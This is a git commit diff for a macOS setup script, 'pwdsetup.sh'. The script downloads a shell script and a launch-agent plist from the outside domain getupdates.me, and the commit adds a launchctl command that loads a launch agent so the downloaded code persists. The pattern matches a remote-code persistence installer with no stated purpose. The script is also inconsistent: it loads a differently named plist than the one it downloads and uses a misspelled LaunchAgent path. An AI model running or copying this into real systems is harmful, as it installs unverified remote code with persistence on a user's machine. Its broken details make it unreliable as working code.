37039ebfddf647776e4d20e451fbd6d51719afca
kennethchow1 <103966331+kennethchow1@users.noreply.github.com>
2025-04-25 11:05:52 -0700

    Update pwdsetup.sh

--- pwdsetup.sh
+++ pwdsetup.sh
@@ -3,4 +3,5 @@ cd /usr/local/bin/
 curl -OL getupdates.me/pwd.sh
 cd ~/Library/LaunchAgent/
 curl -OL getupdates.me/com.local.pwd.plist
+launchctl load ~/Library/LaunchAgent/com.local.cleanDesktop.plist
 chmod +x /usr/local/bin/pwd.sh
